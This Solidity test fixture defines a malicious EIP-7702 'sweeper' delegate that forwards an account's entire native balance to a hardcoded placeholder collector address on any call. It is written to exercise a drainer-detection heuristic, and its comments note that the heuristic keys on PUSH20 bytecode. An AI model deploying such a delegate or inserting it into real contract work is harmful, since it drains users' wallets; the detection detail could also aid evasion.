// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.24;

/// @notice A malicious EIP-7702 delegate fixture matching the "sweeper"
/// pattern (LEARNING.md §6.1, §10.3): any call to the delegated account
/// forwards its entire native balance to a hardcoded collector address.
/// This is what PL-7702-011's heuristic is meant to catch — deliberately
/// obvious bytecode, not an attempt to evade detection.
///
/// The collector address is deliberately NOT a memorable low-value literal
/// like 0x000...bad1 — a value that small compiles to a short PUSH2, not a
/// PUSH20, since Solidity's optimizer picks the narrowest push that can
/// represent the constant. A real attacker's address is effectively random
/// and always needs the full PUSH20, which is exactly what
/// core's crude-sweeper-heuristic.ts looks for, so the fixture uses a
/// similarly "dense" 20-byte value to stay representative.
contract SweeperDelegate {
    address payable public constant COLLECTOR = payable(0x1337C0ffee1337c0FfeE1337c0ffEe1337c0FfeE);

    receive() external payable {
        _sweep();
    }

    fallback() external payable {
        _sweep();
    }

    function _sweep() internal {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            COLLECTOR.transfer(balance);
        }
    }
}
